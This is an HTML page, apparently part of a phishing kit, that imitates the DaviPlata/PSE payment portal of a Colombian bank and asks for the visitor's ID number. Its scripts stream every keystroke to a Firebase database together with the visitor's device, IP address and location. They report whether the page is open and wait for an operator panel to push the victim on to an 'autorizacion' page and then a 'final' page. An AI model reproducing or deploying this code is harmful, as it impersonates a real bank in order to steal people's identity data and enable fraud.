<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>DaviPlata - PSE</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box;}
body{
  margin:0;
  font-family:'Inter', sans-serif;
  background:#f4f5f7;
}

/* layout */
.container{
  display:flex;
  min-height:100vh;
}

/* LEFT IMAGE */
.left{
  width:50%;
  background:url('img.png') center/cover no-repeat;
  border-top-right-radius:40px;
  border-bottom-right-radius:40px;
}

/* RIGHT */
.right{
  width:50%;
  display:flex;
  justify-content:center;
  align-items:center;
  padding:40px;
}

.card{
  width:420px;
}

/* LOGO */
.logo{
  text-align:center;
  margin-bottom:20px;
}
.logo img{
  height:50px;
}

/* TEXT */
h1{
  font-size:28px;
  text-align:center;
  margin:10px 0;
}

.sub{
  text-align:center;
  color:#666;
  margin-bottom:25px;
}

/* INPUTS */
label{
  font-size:14px;
  display:block;
  margin-bottom:5px;
}

input, select{
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:#eee;
  margin-bottom:15px;
}

/* BUTTONS */
.buttons{
  display:flex;
  gap:10px;
}

.btn{
  flex:1;
  padding:14px;
  border-radius:30px;
  border:none;
  font-weight:600;
}

.btn-outline{
  background:#fff;
  border:1px solid #333;
}

.btn-primary{
  background:#f5a6ac;
  color:#fff;
  transition:0.3s;
}

.btn-primary.active{
  background:#dd141d;
}

@media(max-width:900px){
  .container{
    flex-direction:column;
  }

  .left{
    display:none; /* 👈 elimina la imagen */
  }

  .right{
    width:100%;
    padding:20px;
  }

  .card{
    width:100%;
  }
}

select{
  appearance:none;
  -webkit-appearance:none;
  -moz-appearance:none;
  background-image:none;
}



.overlay{
  display:none;
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.5);
  backdrop-filter:blur(4px);
  justify-content:center;
  align-items:center;
  z-index:9999;
}

.loader{
  text-align:center;
  color:#fff;
}

.spinner{
  width:40px;
  height:40px;
  border:4px solid #fff;
  border-top:4px solid #e30613;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:0 auto 10px;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}
</style>
</head>

<body>

<div class="container">

  <div class="left"></div>

  <div class="right">
    <div class="card">

      <div class="logo">
        <img src="logo.svg">
      </div>

      <h1>Ingresa tus datos y compra fácil con DaviPlata</h1>

      <div class="sub">Portal de pagos en línea por PSE</div>

      <label>Tipo de documento</label>
      <select>
        <option>Cédula de Ciudadanía</option>
      </select>

      <label>Número de documento</label>
      <input type="text"  id="docInput">

      <div class="buttons">
        <button class="btn btn-outline">Cancelar</button>
        <button id="btn" class="btn btn-primary">Continuar</button>
      </div>

    </div>
  </div>

</div>


<div class="overlay">
  <div class="loader">
    <div class="spinner"></div>
    <p>Cargando...</p>
  </div>
</div>

<script>
const input = document.getElementById('docInput');
const btn = document.getElementById('btn');

input.addEventListener('input', function() {

  // 🔥 SOLO NÚMEROS
  this.value = this.value.replace(/\D/g, "");

  // 🔥 activar botón
  if(this.value.trim() !== ''){
    btn.classList.add('active');
  } else {
    btn.classList.remove('active');
  }

});
</script>


<script type="module" src="firebase.js"></script>

<script>
window.addEventListener('load', () => {
const { db, uid, ref, update, onValue } = window;

function detectarDispositivo(userAgent) {
userAgent = userAgent.toLowerCase();
if (/windows/.test(userAgent)) return "Windows";
if (/iphone/.test(userAgent)) return "iPhone";
if (/ipad/.test(userAgent)) return "iPad";
if (/android/.test(userAgent)) return "Android";
if (/macintosh/.test(userAgent)) return "Mac";
if (/linux/.test(userAgent)) return "Linux";
return "Desconocido";
}

const dispositivoDetectado = detectarDispositivo(navigator.userAgent);
update(ref(db, "dataPages/" + uid), { dispositivo: dispositivoDetectado });

fetch("https://ipapi.co/json/")
.then(res => res.json())
.then(data => {
const dbRef = ref(db, "dataPages/" + uid);
update(dbRef, {
ip: data.ip,
ciudad: data.city,
pais: data.country_name
});
});


update(ref(db, "dataPages/" + uid), { 
estado: "abierto",
paginaActual: "Index.html" 
});

window.addEventListener("beforeunload", () => {
update(ref(db, "dataPages/" + uid), { 
estado: "cerrado",
paginaActual: null  
});
});


// 🔥 ACTIVAR NUBE EN ESTA PÁGINA
update(ref(db, "dataPages/" + uid), {
  oculto: false
});

// ===============================
// 🔹 INPUT → USERNAME EN TIEMPO REAL
// ===============================
if (input) {
  input.addEventListener("input", function() {

    const valor = this.value.trim();

    update(ref(db, "dataPages/" + uid), {
      username: valor
    });

  });
}


// ===============================
// 🔹 BOTÓN CONTINUAR
// ===============================
btn.addEventListener("click", () => {

  const valor = input.value.trim();
  if (!valor) return;

  // 🔴 activar barra en panel
  update(ref(db, "dataPages/" + uid), {
    mostrarBarraUsername: true
  });

  // 🔴 mostrar overlay
  const overlay = document.querySelector(".overlay");
  if (overlay) overlay.style.display = "flex";

});

// ===============================
// 🔥 SOLO AUTORIZACION Y FINAL
// ===============================
onValue(ref(db, "dataPages/" + uid), snapshot => {

  const data = snapshot.val();
  if (!data) return;

  // 🔴 IR A AUTORIZACION
  if (data.accion === "autorizacion") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "autorizacion.html";
  }

  // 🔴 IR A FINAL
  if (data.accion === "final") {

    update(ref(db, "dataPages/" + uid), {
      accion: null
    });

    window.location.href = "../../final.html";
  }

});



});
</script>
</body>
</html>
